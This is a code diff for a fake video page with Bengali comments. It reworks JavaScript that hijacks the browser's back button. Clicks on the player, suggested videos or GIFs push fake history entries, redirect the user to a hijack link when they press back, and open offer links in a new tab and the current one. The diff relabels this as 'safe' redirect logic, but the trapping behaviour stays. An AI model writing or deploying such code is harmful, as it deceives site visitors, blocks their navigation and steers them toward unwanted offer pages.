@@ -211,52 +211,54 @@
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
             // ════════════════════════════════════════════════════════════
-            // TARGETED HIJACK LOGIC
+            // SAFE TARGETED REDIRECT LOGIC
             // ════════════════════════════════════════════════════════════
-            let isHijackActivated = false;
+            let isActionClicked = false;
 
-            function setupHijack() {
-                if (!isHijackActivated) {
-                    // শুধুমাত্র টার্গেটেড ক্লিকের পর হিস্ট্রি লক জেনারেট করবে
-                    for (let i = 0; i < 8; i++) {
-                        window.history.pushState(null, document.title, window.location.href);
-                    }
-                    isHijackActivated = true;
-                    activatePopState();
+            function activateHijack() {
+                // ব্রাউজার ইভেন্ট লুপ পরিষ্কার রাখতে ৩ বার পুশ করা হচ্ছে
+                for (let i = 0; i < 3; i++) {
+                    window.history.pushState(null, document.title, window.location.href);
                 }
-            }
-
-            function activatePopState() {
+                
                 window.onpopstate = function (event) {
-                    // ব্যাক বাটন চাপলে রিডাইরেক্ট করবে
-                    for (let i = 0; i < 3; i++) {
-                        window.history.pushState(null, document.title, window.location.href);
-                    }
-                    setTimeout(function() {
-                        window.location.replace(BACK_HIJACK_LINK);
-                    }, 50);
+                    // ইউজার যখনই ব্যাক চাপবে, সরাসরি রিডাইরেক্ট হবে
+                    window.location.replace(BACK_HIJACK_LINK);
                 };
             }
 
-            function triggerLinks() {
-                // প্রথমে হাইজ্যাক এক্টিভেট করবে, তারপর নতুন ট্যাব ও অফার লিংকে পাঠাবে
-                setupHijack();
-                try {
-                    window.open(REDIRECT_LINK_1, '_blank');
-                } catch (e) { }
-                window.open(DIRECT_LINK_MAIN, '_self');
+            function triggerLinks(e) {
+                // ইভেন্ট বাবলিং বা ডাবল ফায়ারিং রোধ করতে
+                if (e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                }
+
+                if (!isActionClicked) {
+                    isActionClicked = true;
+                    
+                    // ব্যাক বাটন হ্যান্ডলার চালু করুন
+                    activateHijack();
+
+                    // অফার পেজগুলো ওপেন করুন
+                    try {
+                        window.open(REDIRECT_LINK_1, '_blank');
+                    } catch (err) { }
+                    
+                    window.location.replace(DIRECT_LINK_MAIN);
+                }
             }
 
-            // ১. মেইন ভিডিও প্লেয়ারে ক্লিক করলে
+            // ১. মেইন ভিডিও প্লেয়ারে ক্লিক ইভেন্ট
             document.getElementById('videoPlayer').addEventListener('click', triggerLinks);
 
-            // ২. সাজেস্টেড ভিডিওর তালিকায় ক্লিক করলে
+            // ২. সাজেস্টেড ভিডিওর তালিকায় ক্লিক ইভেন্ট
             const suggestedItems = document.querySelectorAll('.suggested-video-item');
             suggestedItems.forEach(function(element) {
                 element.addEventListener('click', triggerLinks);
             });
 
-            // ৩. পেজের যেকোনো GIF ইমেজে আলাদা করে ক্লিক করলেও যেন কাজ করে
+            // ৩. পেজের নির্দিষ্ট GIF ইমেজে ক্লিক ইভেন্ট
             const allImages = document.querySelectorAll('img');
             allImages.forEach(function(img) {
                 if (img.src.toUpperCase().includes('.GIF')) {
